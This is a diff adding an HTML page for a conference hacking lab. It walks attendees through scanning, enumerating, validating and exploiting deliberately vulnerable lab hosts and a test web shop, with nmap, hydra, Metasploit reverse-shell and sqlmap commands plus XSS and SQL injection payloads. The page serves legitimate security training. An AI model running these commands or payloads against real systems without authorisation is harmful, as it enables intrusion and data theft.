@@ -1,0 +1,467 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#17130f">
+<meta name="description" content="Guided Hidden Chamber missions: choose a tier and walk through the full assessment cycle, discover, enumerate, validate, report, with the tools and documentation steps for each.">
+<title>Chamber Missions · Red Sands Exploitation Arena</title>
+<link rel="stylesheet" href="/css/red-sands.css">
+<style>
+  .picker{display:flex;flex-wrap:wrap;gap:12px;margin-top:10px}
+  .picker button{font:inherit;cursor:pointer;color:var(--rs-sand);background:var(--rs-panel);
+    border:1px solid var(--rs-line);border-radius:var(--rs-radius-sm);padding:14px 18px;text-align:left;
+    min-width:220px;flex:1 1 220px;transition:border-color .15s,background .15s,box-shadow .15s}
+  .picker button:hover{border-color:var(--rs-gold)}
+  .picker button[aria-pressed="true"]{border-color:var(--rs-gold);background:rgba(226,183,92,.10);
+    box-shadow:inset 0 0 0 1px var(--rs-gold)}
+  .picker .pk-name{display:block;font-weight:800;color:var(--rs-gold)}
+  .picker .pk-sub{display:block;color:var(--rs-muted);font-size:.85rem;margin-top:3px}
+  .profile-panel[hidden]{display:none}
+  .pick-hint{color:var(--rs-muted);border:1px dashed var(--rs-line);border-radius:var(--rs-radius-sm);
+    padding:18px;text-align:center;margin-top:16px}
+  .phase{border-left:3px solid var(--rs-teal);padding:2px 0 2px 16px;margin:18px 0}
+  .phase h3{margin:0 0 6px}
+  .phase .ph-tag{color:var(--rs-teal);font-weight:800;font-size:.74rem;letter-spacing:.14em;text-transform:uppercase}
+  .doc-eg{background:var(--rs-panel);border:1px solid var(--rs-line);border-radius:var(--rs-radius-sm);padding:14px 16px;margin:10px 0}
+  .doc-eg dt{color:var(--rs-gold);font-weight:800;font-size:.8rem;letter-spacing:.06em;text-transform:uppercase;margin-top:8px}
+  .doc-eg dd{margin:2px 0 0}
+  .doc-eg dt:first-child{margin-top:0}
+</style>
+</head>
+<body>
+
+<a class="rs-skip" href="#main">Skip to content</a>
+<div class="rs-header" role="banner">
+  <div class="rs-wrap rs-header-inner">
+    <a class="rs-brand" href="/" aria-label="Red Sands Exploitation Arena, home">
+      <svg viewBox="0 0 32 32" aria-hidden="true" focusable="false">
+        <circle cx="16" cy="9" r="4.2" fill="#e2b75c"/>
+        <path d="M3 28 L16 12.5 L29 28 Z" fill="none" stroke="#e2b75c" stroke-width="2" stroke-linejoin="round"/>
+        <path d="M16 12.5 L20.5 28" stroke="#6fc8bd" stroke-width="1.6"/>
+        <path d="M1.5 28.5 H30.5" stroke="#655033" stroke-width="1.6"/>
+      </svg>
+      <span class="rs-brand-full">Red Sands Exploitation Arena</span><span class="rs-brand-short">Red Sands</span>
+    </a>
+    <nav class="rs-nav" aria-label="Arena navigation">
+      <a href="/">Home</a>
+      <a href="/connect.html">Connect</a>
+      <a href="/stations/pharaohs-forge.html"><span class="rs-num">01</span>The Forge</a>
+      <a href="/stations/scribes-arsenal.html"><span class="rs-num">02</span>The Arsenal</a>
+      <a href="/stations/hidden-chamber.html" aria-current="page"><span class="rs-num">03</span>The Chamber</a>
+    </nav>
+  </div>
+  <div class="rs-frieze" aria-hidden="true"></div>
+</div>
+
+<main id="main" class="rs-main">
+<section class="rs-wrap rs-hero">
+  <p class="rs-eyebrow">The Hidden Chamber · Guided Missions</p>
+  <h1>Work the Chamber, Step by Step</h1>
+  <p class="rs-lead">Pick your depth and get a full walkthrough, <strong>discover → enumerate → validate → report</strong>, with the exact tools to run and how to write up what you find. The write-up is the real deliverable; the tools just get you the evidence.</p>
+  <ol class="rs-path">
+    <li><a href="/stations/hidden-chamber.html">The Chamber</a></li>
+    <li aria-current="step">Guided missions</li>
+  </ol>
+</section>
+
+<section class="rs-wrap rs-section">
+  <figure class="fig">
+    <svg viewBox="0 0 900 300" role="img" aria-labelledby="cyc-t cyc-d">
+      <title id="cyc-t">The four-phase assessment cycle</title>
+      <desc id="cyc-d">A repeating loop of four phases. Discover: find what is alive and listening, with nmap and netdiscover. Enumerate: pull detail from each service, with nmap service scans, smbmap and whatweb. Validate: confirm the weakness safely, with searchsploit and the Metasploit check command. Report: write up the finding, which is the real deliverable. The cycle then repeats, as each finding feeds the next.</desc>
+      <defs>
+        <marker id="cyc-teal" markerWidth="10" markerHeight="10" refX="6.5" refY="3" orient="auto"><path d="M0 0 L7 3 L0 6 Z" fill="#6fc8bd"/></marker>
+        <marker id="cyc-gold" markerWidth="10" markerHeight="10" refX="6.5" refY="3" orient="auto"><path d="M0 0 L7 3 L0 6 Z" fill="#c8a24c"/></marker>
+      </defs>
+
+      <!-- Phase 1 Discover -->
+      <rect x="14" y="70" width="194" height="140" rx="10" class="d-box d-box--teal"/>
+      <circle cx="36" cy="92" r="13" fill="#17130f" stroke="#6fc8bd" stroke-width="1.5"/>
+      <text x="36" y="97" text-anchor="middle" class="d-title--teal" font-size="13" font-weight="800">1</text>
+      <text x="118" y="112" text-anchor="middle" class="d-title">Discover</text>
+      <line x1="34" y1="124" x2="188" y2="124" stroke="#5a4228" stroke-width="1"/>
+      <text x="111" y="150" text-anchor="middle" class="d-sub">What is alive and</text>
+      <text x="111" y="168" text-anchor="middle" class="d-sub">listening?</text>
+      <text x="111" y="196" text-anchor="middle" class="d-cap d-mono" fill="#e2b75c">nmap · netdiscover</text>
+
+      <!-- Phase 2 Enumerate -->
+      <rect x="240" y="70" width="194" height="140" rx="10" class="d-box d-box--teal"/>
+      <circle cx="262" cy="92" r="13" fill="#17130f" stroke="#6fc8bd" stroke-width="1.5"/>
+      <text x="262" y="97" text-anchor="middle" class="d-title--teal" font-size="13" font-weight="800">2</text>
+      <text x="344" y="112" text-anchor="middle" class="d-title">Enumerate</text>
+      <line x1="260" y1="124" x2="414" y2="124" stroke="#5a4228" stroke-width="1"/>
+      <text x="337" y="150" text-anchor="middle" class="d-sub">Pull detail from</text>
+      <text x="337" y="168" text-anchor="middle" class="d-sub">each service</text>
+      <text x="337" y="196" text-anchor="middle" class="d-cap d-mono" fill="#e2b75c">nmap -sV · smbmap</text>
+
+      <!-- Phase 3 Validate -->
+      <rect x="466" y="70" width="194" height="140" rx="10" class="d-box d-box--teal"/>
+      <circle cx="488" cy="92" r="13" fill="#17130f" stroke="#6fc8bd" stroke-width="1.5"/>
+      <text x="488" y="97" text-anchor="middle" class="d-title--teal" font-size="13" font-weight="800">3</text>
+      <text x="570" y="112" text-anchor="middle" class="d-title">Validate</text>
+      <line x1="486" y1="124" x2="640" y2="124" stroke="#5a4228" stroke-width="1"/>
+      <text x="563" y="150" text-anchor="middle" class="d-sub">Confirm the</text>
+      <text x="563" y="168" text-anchor="middle" class="d-sub">weakness, safely</text>
+      <text x="563" y="196" text-anchor="middle" class="d-cap d-mono" fill="#e2b75c">searchsploit · check</text>
+
+      <!-- Phase 4 Report (deliverable) -->
+      <rect x="692" y="70" width="194" height="140" rx="10" class="d-box d-box--gold"/>
+      <circle cx="714" cy="92" r="13" fill="#17130f" stroke="#e2b75c" stroke-width="1.5"/>
+      <text x="714" y="97" text-anchor="middle" class="d-title" font-size="13" font-weight="800">4</text>
+      <text x="796" y="112" text-anchor="middle" class="d-title">Report</text>
+      <line x1="712" y1="124" x2="866" y2="124" stroke="#5a4228" stroke-width="1"/>
+      <text x="789" y="150" text-anchor="middle" class="d-sub">Write up the</text>
+      <text x="789" y="168" text-anchor="middle" class="d-sub">finding</text>
+      <text x="789" y="196" text-anchor="middle" class="d-cap" fill="#e2b75c">the real deliverable</text>
+
+      <!-- forward arrows -->
+      <path d="M208 140 L238 140" stroke="#6fc8bd" stroke-width="2.5" fill="none" marker-end="url(#cyc-teal)"/>
+      <path d="M434 140 L464 140" stroke="#6fc8bd" stroke-width="2.5" fill="none" marker-end="url(#cyc-teal)"/>
+      <path d="M660 140 L690 140" stroke="#6fc8bd" stroke-width="2.5" fill="none" marker-end="url(#cyc-teal)"/>
+
+      <!-- loop back: Report -> Discover -->
+      <path d="M789 212 C789 260, 500 272, 111 272 C 111 272, 111 272, 111 214" stroke="#c8a24c" stroke-width="2" fill="none" stroke-dasharray="5 5" marker-end="url(#cyc-gold)"/>
+      <text x="450" y="247" text-anchor="middle" class="d-cap" fill="#e2b75c">the cycle repeats, each finding feeds the next</text>
+    </svg>
+    <figcaption>Every mission walks this loop: find, detail, confirm, then write it up. The report is what a real assessment is paid for.</figcaption>
+  </figure>
+</section>
+
+<!-- SHARED SETUP -->
+<section class="rs-wrap rs-section">
+  <div class="rs-card">
+    <h2>Before any tier</h2>
+    <div class="rs-callout rs-callout-warning">
+      <strong>Scope:</strong> only the target a volunteer points you to, <code>10.50.70.52</code> (Linux) or <code>10.50.70.53</code> (Windows). Nothing else, on the lab or anywhere. Keep Nmap timing at <code>-T3</code> or lower; the boxes are shared.
+    </div>
+    <ol class="rs-steps">
+      <li>Set your target and a place for evidence:
+        <pre><code>TARGET=10.50.70.52        # or .53, whichever your challenge uses
+mkdir -p ~/red-sands/evidence &amp;&amp; cd ~/red-sands/evidence</code></pre></li>
+      <li>Capture everything you do. Your notes are the deliverable:
+        <pre><code>script -a ~/red-sands/evidence/session-$(date +%H%M).log   # records your whole terminal</code></pre>
+        (type <code>exit</code> to stop recording.) Or append single outputs with <code>| tee -a notes.txt</code>.</li>
+      <li>Confirm you can reach the target and nothing else: <code>ping -c2 "$TARGET"</code></li>
+    </ol>
+  </div>
+</section>
+
+<!-- PICKER -->
+<section class="rs-wrap rs-section">
+  <div class="rs-card">
+    <h2>Pick your mission</h2>
+    <p class="rs-muted">Three depth tiers against the Metasploitable hosts (<code>10.50.70.52</code> / <code>.53</code>), start at the Outer Chamber even if you’re experienced, it feeds the deeper tiers, plus a web-exploitation track against the Hackazon app.</p>
+    <div class="picker" role="group" aria-label="Chamber mission">
+      <button type="button" data-profile="outer" aria-pressed="false" aria-controls="panel-outer">
+        <span class="pk-name">The Outer Chamber</span><span class="pk-sub">Initiate · enumerate &amp; inspect</span>
+      </button>
+      <button type="button" data-profile="inner" aria-pressed="false" aria-controls="panel-inner">
+        <span class="pk-name">The Inner Chamber</span><span class="pk-sub">Scribe · validate a weakness</span>
+      </button>
+      <button type="button" data-profile="burial" aria-pressed="false" aria-controls="panel-burial">
+        <span class="pk-name">The Burial Chamber</span><span class="pk-sub">High Priest · gain access</span>
+      </button>
+      <button type="button" data-profile="hackazon" aria-pressed="false" aria-controls="panel-hackazon">
+        <span class="pk-name">The Web App</span><span class="pk-sub">Hackazon · web exploitation</span>
+      </button>
+    </div>
+  </div>
+</section>
+
+<section class="rs-wrap rs-section">
+  <p class="pick-hint" id="pickHint">↑ Pick a tier above to see its full walkthrough.</p>
+
+  <!-- OUTER -->
+  <article class="profile-panel rs-card" id="panel-outer" data-panel="outer" hidden>
+    <div class="rs-meta"><span class="rs-pill rs-tier rs-tier-initiate">Initiate</span><span class="rs-pill">~15 min</span></div>
+    <h2>The Outer Chamber: Enumerate &amp; inspect</h2>
+    <p class="rs-muted">Goal: learn the target without changing it. You’ll finish with one service, its version, and one thing it exposes that it shouldn’t. No exploitation at this tier.</p>
+    <p class="rs-hint">Deeper on the scanning here → <a href="/resources/red-sands/tool-nmap-nse.html">Nmap &amp; NSE reference</a>.</p>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 1 · Discover</span>
+      <h3>What’s actually here?</h3>
+      <p>Run a service + version scan and let the default scripts add detail:</p>
+      <pre><code>nmap -sV -sC -T3 --top-ports 100 -oN nmap_$TARGET.txt "$TARGET"</code></pre>
+      <p class="rs-muted"><code>-sV</code> = ask each service to identify itself · <code>-sC</code> = safe default scripts · <code>-oN</code> saves the output as evidence. Read it top to bottom; note every open port and the product/version.</p>
+      <p class="rs-hint"><strong>Optional:</strong> see what else is alive on the lab segment first with a layer-2 sweep, <code>sudo netdiscover -r 10.50.70.0/24</code> or <code>sudo arp-scan --localnet</code>. (Your target is already given, so this is for the habit, not the hunt.)</p>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 2 · Enumerate</span>
+      <h3>Look closer at one or two services</h3>
+      <p>Pick services from your scan and inspect them without logging in to anything you shouldn’t:</p>
+      <pre><code># FTP (port 21) - is anonymous login allowed?
+nmap --script ftp-anon -p21 "$TARGET"
+
+# SMB (port 445) - list shares, then map what each one allows
+smbclient -L //"$TARGET" -N
+enum4linux-ng -A "$TARGET" | tee smb_$TARGET.txt
+smbmap -H "$TARGET"                       # READ/WRITE per share, at a glance
+
+# Web (port 80 / 8080 / 8585 / …) - identify, then look deeper
+whatweb http://"$TARGET"/                 # app + version
+curl -sI http://"$TARGET"/                # headers
+nikto -host http://"$TARGET"/ | tee nikto_$TARGET.txt   # quick misconfig sweep
+gobuster dir -u http://"$TARGET"/ -w /usr/share/wordlists/dirb/common.txt   # hidden paths
+wpscan --url http://"$TARGET":8585/       # if it's WordPress
+
+# SNMP (udp 161), if open - often wide open on lab boxes
+onesixtyone "$TARGET" public
+snmpwalk -v2c -c public "$TARGET" | head
+
+# Any port - just talk to it and read the banner
+nc -nv "$TARGET" 21</code></pre>
+      <p class="rs-muted">You’re reading what each service volunteers about itself. That habit is the whole point of this tier. Pick one or two services; you don’t need to run every line.</p>
+      <div class="rs-callout">Keep it gentle on shared boxes: one content scan at a time, default threads. <code>nikto</code> and <code>gobuster</code> are noisy, let a volunteer know before you fan out.</div>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 3 · Report</span>
+      <h3>Write one clean finding</h3>
+      <p>Pick the single most interesting thing and write it up (template at the bottom of this page). A worked example:</p>
+      <dl class="doc-eg">
+        <dt>Observation</dt><dd>Anonymous FTP is enabled on <code>10.50.70.52:21</code> (ProFTPD). Logged in as <code>anonymous</code> with any password and listed files.</dd>
+        <dt>Evidence</dt><dd><code>nmap --script ftp-anon</code> reports “Anonymous FTP login allowed”; directory listing captured in <code>nmap_10.50.70.52.txt</code>.</dd>
+        <dt>Impact</dt><dd>Anyone on the network can read whatever is shared, no credentials needed.</dd>
+        <dt>Remediation</dt><dd>Disable anonymous FTP, or require authentication and restrict the shared directory.</dd>
+      </dl>
+      <p class="rs-hint">Tools for capturing and writing this up → <a href="/resources/red-sands/documenting-and-reporting.html">Document &amp; Report</a>.</p>
+    </div>
+    <div class="rs-callout">Done? Show a volunteer your finding and keep your scan output, the Inner Chamber starts from it.</div>
+  </article>
+
+  <!-- INNER -->
+  <article class="profile-panel rs-card" id="panel-inner" data-panel="inner" hidden>
+    <div class="rs-meta"><span class="rs-pill rs-tier rs-tier-scribe">Scribe</span><span class="rs-pill">~25 min</span></div>
+    <h2>The Inner Chamber: Validate a weakness</h2>
+    <p class="rs-muted">Goal: confirm, don’t just suspect, a known weakness on a service you enumerated. You’ll prove it safely, without exploiting it.</p>
+    <p class="rs-hint">Deeper on the framework here → <a href="/resources/red-sands/tool-metasploit.html">Metasploit reference</a>.</p>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 1 · Discover / Enumerate</span>
+      <h3>Pick a service with a known issue</h3>
+      <p>From your Outer-Chamber scan, choose a service that tends to carry well-known flaws:</p>
+      <ul>
+        <li><strong>Linux (10.50.70.52):</strong> the web CMS (e.g. Drupal), the FTP daemon, or a database.</li>
+        <li><strong>Windows (10.50.70.53):</strong> Jenkins, the Tomcat manager, or Elasticsearch.</li>
+      </ul>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 2 · Research</span>
+      <h3>Match the version to a known weakness</h3>
+      <pre><code>searchsploit &lt;product&gt; &lt;version&gt;        # e.g. searchsploit drupal 7
+# or read the version straight from the service:
+curl -s http://"$TARGET":9200/            # Elasticsearch - version in the JSON
+curl -s http://"$TARGET"/CHANGELOG.txt    # Drupal/CMS - version at the top</code></pre>
+      <p class="rs-muted">Write down the CVE or advisory you think applies. You’re about to confirm it.</p>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 3 · Validate (safely)</span>
+      <h3>Confirm it with <code>check</code>, not <code>run</code></h3>
+      <p>Metasploit modules have a <code>check</code> action that confirms a target is vulnerable <em>without</em> exploiting it:</p>
+      <pre><code>msfconsole -q
+search &lt;product&gt;
+use &lt;module&gt;
+set RHOSTS "$TARGET"
+check            # ← stop here at this tier; read what it reports</code></pre>
+      <p>Some weaknesses have a dedicated, non-destructive <strong>Nmap script</strong> that confirms them without Metasploit at all:</p>
+      <pre><code>nmap --script vuln -p &lt;port&gt; "$TARGET"             # safe vuln-detection scripts
+nmap --script smb-vuln-ms17-010 -p445 "$TARGET"   # e.g. EternalBlue - detection only</code></pre>
+      <p class="rs-hint"><strong>Weak credentials?</strong> If you suspect a default or weak login, confirm it <em>gently</em> and only with a volunteer’s OK, a tiny, targeted wordlist, never a full brute force on a shared box:<br><code>hydra -l admin -P /usr/share/wordlists/small.txt ftp://"$TARGET" -t 2 -f</code></p>
+      <div class="rs-callout rs-callout-warning">Only <code>check</code> / detect at this tier. Never <code>run</code> a module whose <code>check</code> you haven’t read, and modules (or credential attacks) that can crash or lock out a service are <strong>volunteer-demo only</strong>.</div>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 4 · Report</span>
+      <h3>Write the validated finding</h3>
+      <dl class="doc-eg">
+        <dt>Observation</dt><dd>Elasticsearch on <code>10.50.70.53:9200</code> reports version 1.1.1, affected by CVE-2014-3120.</dd>
+        <dt>Evidence</dt><dd><code>curl :9200/</code> shows the version; Metasploit <code>check</code> returns “The target appears to be vulnerable.”</dd>
+        <dt>Impact</dt><dd>An attacker could run code on the server via the vulnerable scripting feature.</dd>
+        <dt>Remediation</dt><dd>Upgrade Elasticsearch to a fixed release; disable dynamic scripting; restrict network access to the service.</dd>
+      </dl>
+      <p class="rs-hint">Tools for capturing and writing this up → <a href="/resources/red-sands/documenting-and-reporting.html">Document &amp; Report</a>.</p>
+    </div>
+    <div class="rs-callout">Done? Walk a volunteer through your validation evidence. If you’re cleared to go further, continue to the Burial Chamber.</div>
+  </article>
+
+  <!-- BURIAL -->
+  <article class="profile-panel rs-card" id="panel-burial" data-panel="burial" hidden>
+    <div class="rs-meta"><span class="rs-pill rs-tier rs-tier-priest">High Priest</span><span class="rs-pill">~35 min</span></div>
+    <h2>The Burial Chamber: Gain access &amp; recover the relic</h2>
+    <p class="rs-muted">Goal: turn a validated finding into access on an <strong>approved</strong> service, then capture that service's <strong>flag, a hidden playing card</strong>. The full write-up, discovery to access, is the deliverable.</p>
+    <p class="rs-hint">Deeper on sessions &amp; Meterpreter → <a href="/resources/red-sands/tool-metasploit.html">Metasploit reference</a>.</p>
+
+    <div class="rs-callout rs-callout-warning">
+      <strong>Get the green light first.</strong> Confirm the exact service with a volunteer. <code>MS17-010</code> (EternalBlue) and any memory-corruption exploit can crash the shared target, those are <strong>volunteer demo only</strong>, never run against the live lab host.
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 1 · Set up the exploit</span>
+      <h3>Point the validated module at the target</h3>
+      <p>First find your own IP on the attendee network, reverse shells come back to this address:</p>
+      <pre><code>ip -br address        # your 10.50.60.x address = LHOST</code></pre>
+      <pre><code>msfconsole -q
+use &lt;the module you validated in the Inner Chamber&gt;
+set RHOSTS "$TARGET"
+set LHOST  &lt;your 10.50.60.x address&gt;
+set LPORT  4444
+check                  # confirm one more time before you run</code></pre>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 2 · Gain access</span>
+      <h3>Run it and catch the session</h3>
+      <pre><code>run            # opens a session if it lands
+# then, in the session:
+getuid         # (meterpreter) who am I on the target?
+sysinfo        # (meterpreter) what host is this?</code></pre>
+      <p class="rs-muted">If you get a raw shell instead of meterpreter, use <code>whoami</code> / <code>id</code> and <code>hostname</code>.</p>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 3 · Recover the relic</span>
+      <h3>Capture the card flag</h3>
+      <p>Each service hides a <strong>flag, a playing card</strong>. With access, track down the card tied to the service you exploited. Some sit in a folder; many are tucked inside another file (an image, document, capture, or database) and need a quick extraction.</p>
+      <pre><code># look where you landed and in the usual spots
+ls -la ; find / -iname '*_of_*' 2>/dev/null     # Linux
+dir /s                                          # Windows
+
+# if a file won't open, the card is hidden inside it - carve it out:
+binwalk &lt;file&gt;        # spot embedded data
+foremost &lt;file&gt;       # recover an embedded image</code></pre>
+      <p class="rs-muted">A file that won’t display <em>is</em> the puzzle, the card usually has to be extracted or decoded. A volunteer holds the card list and will point you to the right one and confirm your capture.</p>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 4 · Report</span>
+      <h3>Document the whole path</h3>
+      <p>Your write-up should let someone reproduce the entire route: the service you chose and why, the version/CVE, the <code>check</code> result, the module and options you set, the session you got, and the flag. Use the template below.</p>
+      <p class="rs-hint">Tools for capturing and writing this up → <a href="/resources/red-sands/documenting-and-reporting.html">Document &amp; Report</a>.</p>
+      <div class="rs-callout">When you’re finished, ask a volunteer to <strong>reset the target</strong> so the next person starts clean. No persistence, no changes left behind.</div>
+    </div>
+  </article>
+
+  <!-- HACKAZON (web app) -->
+  <article class="profile-panel rs-card" id="panel-hackazon" data-panel="hackazon" hidden>
+    <div class="rs-meta"><span class="rs-pill rs-tier rs-tier-scribe">Scribe → High Priest</span><span class="rs-pill">~30 min</span></div>
+    <h2>The Web App: Hackazon</h2>
+    <p class="rs-muted">Hackazon is the deliberately vulnerable online shop you inspected at the Scribe’s Arsenal. Here you go further, find, confirm, and demonstrate a real web vulnerability, then write it up. There’s no card flag on this one; your evidence of a working exploit is the prize.</p>
+    <p class="rs-hint">Deeper on the proxy workflow → <a href="/resources/red-sands/tool-burp-suite.html">Burp Suite reference</a>.</p>
+
+    <div class="rs-callout rs-callout-warning">
+      <strong>Scope:</strong> only the lab Hackazon URL a volunteer gives you (<code>http://&lt;hackazon&gt;/</code>). Don’t point web tools at anything else. Keep automated tools gentle on the shared app (few threads, modest <code>--level</code>/<code>--risk</code>), and don’t wipe or corrupt its data.
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 1 · Map the app</span>
+      <h3>See everything it does</h3>
+      <p>Browse the shop with <strong>Burp</strong> (Community) in the loop so every request is recorded, log in, search, open a product, add to cart, view your profile and orders.</p>
+      <pre><code># point the browser at Burp's proxy (127.0.0.1:8080), then walk the whole app.
+# Burp → Target → Site map fills in as you click. Note every input:
+#   search box · product/category id in the URL · login · cart · profile / order ids · any /api endpoints</code></pre>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 2 · Pick an input to test</span>
+      <h3>Where does your input reach the app?</h3>
+      <p>From the site map, list the spots where your input is reflected on the page, used in a lookup, or names an object by id. Good first targets: the search term, a product/category <code>id</code> parameter, the login form, and any order/profile id.</p>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 3 · Find &amp; confirm a vulnerability</span>
+      <h3>Try one of these classes</h3>
+      <p><strong>SQL injection</strong>, on a parameter such as a product/category id:</p>
+      <pre><code># manual: does a quote break it, and does a true/false pair change the result?
+#   ...?id=1'                         → error or a different page
+#   ...?id=1 AND 1=1   vs   ...?id=1 AND 1=2
+# then confirm/enumerate with sqlmap - scoped to the one URL and kept gentle:
+sqlmap -u "http://&lt;hackazon&gt;/...?id=1" --batch --level=2 --risk=1 --threads=2 --dbs</code></pre>
+      <p class="rs-hint"><strong>Tip:</strong> try the id in the URL and the search box first, but the <em>filter and sort</em> parameters and any <code>/api</code> endpoint are injectable too. If a scanner finds nothing, that’s expected, Hackazon resists naive scanning, so test by hand. Let sqlmap <em>confirm</em> what your quote-and-boolean test already suggested, rather than firing it blind.</p>
+      <p><strong>Cross-site scripting (XSS)</strong>, on a reflected input like the search box or a review field:</p>
+      <pre><code># inject a harmless proof payload and see whether it runs:
+#   &lt;script&gt;alert(1)&lt;/script&gt;      or      &lt;img src=x onerror=alert(1)&gt;
+# reflected = it fires on your own result page · stored = it fires for anyone who views it later</code></pre>
+      <p class="rs-hint"><strong>Tip:</strong> the search box is the quick reflected win. For a <em>stored</em> one, drop the payload in a product review or a profile field, then reload the page as a fresh visit, if it fires without you re-submitting, it’s stored, which is the higher-impact finding. If angle brackets get stripped, try an attribute-breakout like <code>" onmouseover=alert(1) x="</code>.</p>
+      <p><strong>IDOR / broken access control</strong>, on a request that names an object by id:</p>
+      <pre><code># in Burp Repeater, take a request for YOUR order/profile and change the id:
+#   GET /account/order?id=1001   →   id=1002
+# if you can read (or change) someone else's record, that's broken access control.</code></pre>
+      <p class="rs-hint"><strong>Tip:</strong> make two accounts (or note another attendee’s order id) so you have a “someone else” to reach. Increment or decrement the id and watch the response, another user’s name, address, or order means you’re in. The same trick applies to wishlists and cart items, not just orders.</p>
+      <p class="rs-muted" style="margin-top:14px"><strong>Other classes worth a look, if you want to push further:</strong></p>
+      <ul>
+        <li><strong>Parameter tampering</strong>, in Burp, change a <em>price</em> or <em>quantity</em> in the add-to-cart / checkout request and see whether the app trusts it.</li>
+        <li><strong>CSRF</strong>, check a state-changing form (profile update, add-to-cart): if the request carries no unpredictable token, it’s forgeable.</li>
+        <li><strong>Open redirect</strong>, look for a redirect / return-URL parameter that will bounce you to an outside address.</li>
+        <li><strong>API surface</strong>, the REST/SOAP endpoints are their own attack surface; the same injection and access-control ideas apply there, often with less input filtering.</li>
+      </ul>
+      <div class="rs-callout">Confirm before you claim it: a real finding means you can show the effect, data returned, the alert firing, another user’s record, and you’ve captured the request and response as evidence.</div>
+    </div>
+
+    <div class="phase">
+      <span class="ph-tag">Phase 4 · Report</span>
+      <h3>Write it up</h3>
+      <p>Document each finding with the four-part structure below. Name the class. It maps to the OWASP Top 10 (Injection, XSS, Broken Access Control), paste the request/response that proves it, state the real-world impact, and give the fix (parameterized queries, output encoding, server-side authorization checks). A volunteer verifies your evidence.</p>
+      <p class="rs-hint">Tools for capturing and writing this up → <a href="/resources/red-sands/documenting-and-reporting.html">Document &amp; Report</a>.</p>
+    </div>
+  </article>
+</section>
+
+<!-- DOCUMENTATION TEMPLATE (always visible) -->
+<section class="rs-wrap rs-section">
+  <div class="rs-card">
+    <h2>How to document every finding</h2>
+    <p>Whatever tier you reach, a finding has the same four parts. This is what separates “I ran a tool” from “I found something.”</p>
+    <div class="rs-grid">
+      <article class="rs-card rs-card-plain"><h3>Observation</h3><p>What you saw: target, service, port, timestamp, and the command plus the relevant output.</p></article>
+      <article class="rs-card rs-card-plain"><h3>Evidence</h3><p>The single piece of proof behind your conclusion. Could another tester reproduce it from your notes?</p></article>
+      <article class="rs-card rs-card-plain"><h3>Impact</h3><p>What an attacker could realistically do if this existed in a real environment.</p></article>
+      <article class="rs-card rs-card-plain"><h3>Remediation</h3><p>The patch, version upgrade, config change, or compensating control that reduces the risk.</p></article>
+    </div>
+    <p class="rs-muted" style="margin-top:12px">Keep the raw output in <code>~/red-sands/evidence/</code> (that’s what <code>script</code> and <code>tee</code> were for). Good evidence is reproducible, timestamped, and points at one clear conclusion.</p>
+    <p>Need the tools for capturing screenshots, organising findings, and generating the final report? The <a href="/resources/red-sands/documenting-and-reporting.html"><strong>Document &amp; Report</strong></a> toolkit walks through all of them.</p>
+    <div class="rs-actions">
+      <a class="rs-button rs-button-primary" href="/resources/red-sands/documenting-and-reporting.html">Document &amp; Report toolkit →</a>
+      <a class="rs-button" href="/resources/red-sands/sample-report.html">See a full sample report</a>
+      <a class="rs-button" href="/stations/hidden-chamber.html">← Back to the Hidden Chamber</a>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="rs-footer">
+  <div class="rs-wrap rs-footer-row">
+    <span><strong>Red Sands Exploitation Arena</strong> · The Hidden Chamber · Guided Missions</span>
+    <span>Queen City Con · Cincinnati, Ohio · November 13–15, 2026</span>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btns = Array.prototype.slice.call(document.querySelectorAll('[data-profile]'));
+  var panels = Array.prototype.slice.call(document.querySelectorAll('[data-panel]'));
+  var hint = document.getElementById('pickHint');
+  function select(key, scroll){
+    var found = false;
+    btns.forEach(function(b){ var on = b.dataset.profile === key; b.setAttribute('aria-pressed', on ? 'true' : 'false'); if(on) found = true; });
+    if(!found) return;
+    panels.forEach(function(p){ p.hidden = (p.dataset.panel !== key); });
+    if (hint) hint.hidden = true;
+    var active = document.getElementById('panel-' + key);
+    if (scroll && active && window.matchMedia('(max-width: 700px)').matches) {
+      active.scrollIntoView({behavior:'smooth', block:'start'});
+    }
+  }
+  btns.forEach(function(b){ b.addEventListener('click', function(){ select(b.dataset.profile, true); }); });
+  // deep-link: #outer / #inner / #burial preselects
+  var h = (location.hash || '').replace('#','');
+  if (h) select(h, false);
+  window.addEventListener('hashchange', function(){ select((location.hash||'').replace('#',''), true); });
+})();
+</script>
+</body>
+</html>
